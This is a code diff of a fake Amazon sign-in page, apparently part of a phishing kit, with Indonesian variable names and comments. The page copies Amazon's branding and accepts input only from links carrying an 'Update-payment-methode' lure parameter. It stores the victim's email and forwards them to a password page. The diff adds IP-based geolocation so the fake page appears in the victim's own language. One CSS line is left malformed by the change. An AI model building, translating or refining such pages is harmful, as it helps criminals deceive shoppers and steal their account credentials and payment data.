@@ -16,7 +16,7 @@
         .input:focus { border-color: #007185; box-shadow: 0 0 0 2px #c8f0f4; }
         .input.salah { border-color: #d00; border-width: 2px; }
         .pesan-merah { color: #d00; font-size: 13px; margin: 0 0 15px; display: none; align-items: center; gap: 6px; }
-        .ikon-bulat { display: inline-flex; align-items: center; justify-content: center; width: 18px; height: 18px; background: #d00; color: #fff; border-radius: 50%; font-size: 12px; font-weight: bold; flex-shrink: 0; }
+        .ikon-bulat { display: inline-flex; align-items: center; justify-content: center: width: 18px; height: 18px; background: #d00; color: #fff; border-radius: 50%; font-size: 12px; font-weight: bold; flex-shrink: 0; }
         .tombol { width: 100%; padding: 6px; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; font-size: 14px; height: 40px; cursor: pointer; margin-bottom: 20px; }
         .tombol:hover { background: #f7ca00; }
         .syarat { font-size: 12px; line-height: 1.5; margin-bottom: 25px; }
@@ -33,31 +33,183 @@
 <body>
     <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
     <div class="kotak">
-        <h1>Sign in or create account</h1>
-        <label for="email">Enter mobile number or email</label>
+        <h1 id="judul">Sign in or create account</h1>
+        <label id="labelEmail" for="email">Enter mobile number or email</label>
         <input type="text" id="email" class="input">
         <p id="pesanKosong" class="pesan-merah">
             <span class="ikon-bulat">!</span>
-            Enter your mobile number or email
+            <span id="teksKosong">Enter your mobile number or email</span>
         </p>
         <p id="pesanLink" class="pesan-merah">
             <span class="ikon-bulat">!</span>
-            Enter your mobile number or email
+            <span id="teksLink">Invalid access link</span>
         </p>
-        <button type="button" id="lanjut" class="tombol">Continue</button>
-        <p class="syarat">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
-        <p class="bantuan"><a href="#">Need help?</a></p>
-        <div class="bisnis">
-            <strong>Buying for work?</strong>
-            <a href="#">Create a free business account</a>
+        <button type="button" id="lanjut" class="tombol">
+            <span id="teksLanjut">Continue</span>
+        </button>
+        <p class="syarat" id="syarat">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
+        <p class="bantuan"><a href="#" id="bantuan">Need help?</a></p>
+        <div class="bisnis" id="bagianBisnis">
+            <strong id="bisnisJudul">Buying for work?</strong>
+            <a href="#" id="bisnisLink">Create a free business account</a>
         </div>
     </div>
     <div class="bawah">
-        <p><a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a> <a href="#">Help</a></p>
-        <p style="margin-top:8px; color:#767676;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <p><a href="#" id="syaratLink1">Conditions of Use</a> <a href="#" id="syaratLink2">Privacy Notice</a> <a href="#" id="bantuanLink">Help</a></p>
+        <p style="margin-top:8px; color:#767676;" id="hakCiptaan">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
 
 <script>
+// ==============================================
+// DAFTAR TERJEMAHAN LENGKAP
+// ==============================================
+const terjemahan = {
+    EN: {
+        judul: 'Sign in or create account',
+        labelEmail: 'Enter mobile number or email',
+        teksKosong: 'Enter your mobile number or email',
+        teksLink: 'Invalid access link',
+        teksLanjut: 'Continue',
+        syarat: 'By continuing, you agree to Amazon\'s <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.',
+        bantuan: 'Need help?',
+        bisnisJudul: 'Buying for work?',
+        bisnisLink: 'Create a free business account',
+        syaratLink1: 'Conditions of Use',
+        syaratLink2: 'Privacy Notice',
+        bantuanLink: 'Help',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. or its affiliates'
+    },
+    JA: {
+        judul: 'ログインまたはアカウント作成',
+        labelEmail: '携帯電話番号またはメールアドレスを入力',
+        teksKosong: '携帯電話番号またはメールアドレスを入力してください',
+        teksLink: '無効なアクセスリンクです',
+        teksLanjut: '続行',
+        syarat: '続行することで、Amazonの<a href="#">利用規約</a>および<a href="#">プライバシー通知</a>に同意するものとします。',
+        bantuan: 'お困りですか？',
+        bisnisJudul: '業務用に購入ですか？',
+        bisnisLink: '無料の法人アカウントを作成',
+        syaratLink1: '利用規約',
+        syaratLink2: 'プライバシー通知',
+        bantuanLink: 'ヘルプ',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. またはその関連会社'
+    },
+    ZH: {
+        judul: '登录或创建账户',
+        labelEmail: '输入手机号码或电子邮箱',
+        teksKosong: '请输入您的手机号码或电子邮箱',
+        teksLink: '访问链接无效',
+        teksLanjut: '继续',
+        syarat: '继续即表示您同意亚马逊的<a href="#">使用条件</a>和<a href="#">隐私声明</a>。',
+        bantuan: '需要帮助？',
+        bisnisJudul: '为工作采购？',
+        bisnisLink: '创建免费商务账户',
+        syaratLink1: '使用条件',
+        syaratLink2: '隐私声明',
+        bantuanLink: '帮助',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. 或其关联公司'
+    },
+    TH: {
+        judul: 'เข้าสู่ระบบหรือสร้างบัญชี',
+        labelEmail: 'ป้อนหมายเลขโทรศัพท์มือถือหรืออีเมล',
+        teksKosong: 'กรุณาป้อนหมายเลขโทรศัพท์มือถือหรืออีเมลของคุณ',
+        teksLink: 'ลิงก์เข้าถึงไม่ถูกต้อง',
+        teksLanjut: 'ดำเนินการต่อ',
+        syarat: 'ดำเนินการต่อแสดงว่าคุณยอมรับ<a href="#">เงื่อนไขการใช้งาน</a>และ<a href="#">ประกาศความเป็นส่วนตัว</a>ของ Amazon',
+        bantuan: 'ต้องการความช่วยเหลือหรือไม่',
+        bisnisJudul: 'ซื้อเพื่อธุรกิจหรือไม่',
+        bisnisLink: 'สร้างบัญชีธุรกิจฟรี',
+        syaratLink1: 'เงื่อนไขการใช้งาน',
+        syaratLink2: 'ประกาศความเป็นส่วนตัว',
+        bantuanLink: 'ช่วยเหลือ',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. หรือบริษัทในเครือ'
+    },
+    KO: {
+        judul: '로그인 또는 계정 생성',
+        labelEmail: '휴대폰 번호 또는 이메일 입력',
+        teksKosong: '휴대폰 번호 또는 이메일을 입력하세요',
+        teksLink: '유효하지 않은 접근 링크입니다',
+        teksLanjut: '계속',
+        syarat: '계속하면 Amazon의 <a href="#">이용 약관</a> 및 <a href="#">개인정보 처리방침</a>에 동의하는 것으로 간주됩니다.',
+        bantuan: '도움이 필요하신가요?',
+        bisnisJudul: '업무용으로 구매하시나요?',
+        bisnisLink: '무료 비즈니스 계정 생성',
+        syaratLink1: '이용 약관',
+        syaratLink2: '개인정보 처리방침',
+        bantuanLink: '도움말',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. 또는 그 계열사'
+    },
+    ID: {
+        judul: 'Masuk atau Buat Akun',
+        labelEmail: 'Masukkan nomor ponsel atau email',
+        teksKosong: 'Masukkan nomor ponsel atau email Anda',
+        teksLink: 'Tautan akses tidak valid',
+        teksLanjut: 'Lanjutkan',
+        syarat: 'Dengan melanjutkan, Anda menyetujui <a href="#">Syarat Penggunaan</a> dan <a href="#">Pemberitahuan Privasi</a> Amazon.',
+        bantuan: 'Butuh bantuan?',
+        bisnisJudul: 'Berbelanja untuk keperluan bisnis?',
+        bisnisLink: 'Buat akun bisnis gratis',
+        syaratLink1: 'Syarat Penggunaan',
+        syaratLink2: 'Pemberitahuan Privasi',
+        bantuanLink: 'Bantuan',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. atau afiliasinya'
+    }
+};
+
+// Peta Kode Negara → Bahasa
+const negaraKeBahasa = {
+    JP: 'JA',
+    CN: 'ZH',
+    HK: 'ZH',
+    TW: 'ZH',
+    TH: 'TH',
+    KR: 'KO',
+    ID: 'ID',
+    MY: 'EN',
+    SG: 'EN',
+    US: 'EN',
+    AU: 'EN',
+    GB: 'EN',
+    CA: 'EN',
+    NZ: 'EN'
+};
+
+// ==============================================
+// DETEKSI NEGARA & TERAPKAN BAHASA
+// ==============================================
+async function terapkanBahasa() {
+    let kodeNegara = 'GB'; // Default
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        kodeNegara = data.country_code || 'GB';
+    } catch (e) {
+        console.log('Gagal deteksi lokasi, gunakan default');
+    }
+
+    const kodeBahasa = negaraKeBahasa[kodeNegara] || 'EN';
+    const teks = terjemahan[kodeBahasa] || terjemahan.EN;
+
+    // Terapkan semua teks
+    document.documentElement.lang = kodeBahasa.toLowerCase();
+    document.getElementById('judul').textContent = teks.judul;
+    document.getElementById('labelEmail').textContent = teks.labelEmail;
+    document.getElementById('teksKosong').textContent = teks.teksKosong;
+    document.getElementById('teksLink').textContent = teks.teksLink;
+    document.getElementById('teksLanjut').textContent = teks.teksLanjut;
+    document.getElementById('syarat').innerHTML = teks.syarat;
+    document.getElementById('bantuan').textContent = teks.bantuan;
+    document.getElementById('bisnisJudul').textContent = teks.bisnisJudul;
+    document.getElementById('bisnisLink').textContent = teks.bisnisLink;
+    document.getElementById('syaratLink1').textContent = teks.syaratLink1;
+    document.getElementById('syaratLink2').textContent = teks.syaratLink2;
+    document.getElementById('bantuanLink').textContent = teks.bantuanLink;
+    document.getElementById('hakCiptaan').textContent = teks.hakCiptaan;
+}
+
+// ==============================================
+// FUNGSI UTAMA
+// ==============================================
 const paramNama = 'Update-payment-methode';
 const queryStr = window.location.search.substring(1);
 const validParam = queryStr.includes(paramNama);
@@ -78,32 +230,31 @@ emailInput.addEventListener('input', () => {
     pesanLink.style.display = 'none';
 });
 
-// Klik tombol — FUNGSI UTAMA
+// Klik tombol
 tombolLanjut.onclick = function() {
     const isiEmail = emailInput.value.trim();
     
-    // Reset pesan
     pesanKosong.style.display = 'none';
     pesanLink.style.display = 'none';
     emailInput.classList.remove('salah');
     
-    // Cek parameter link
     if (!validParam) {
         pesanLink.style.display = 'flex';
         return;
     }
     
-    // Cek kolom kosong
     if (!isiEmail) {
         emailInput.classList.add('salah');
         pesanKosong.style.display = 'flex';
         return;
     }
     
-    // ✅ BERHASIL — Simpan & Pindah Halaman
     localStorage.setItem('email_pengguna', isiEmail);
     window.location.href = 'password.html';
 };
+
+// Jalankan deteksi bahasa saat halaman dibuka
+terapkanBahasa();
 </script>
 </body>
 </html>
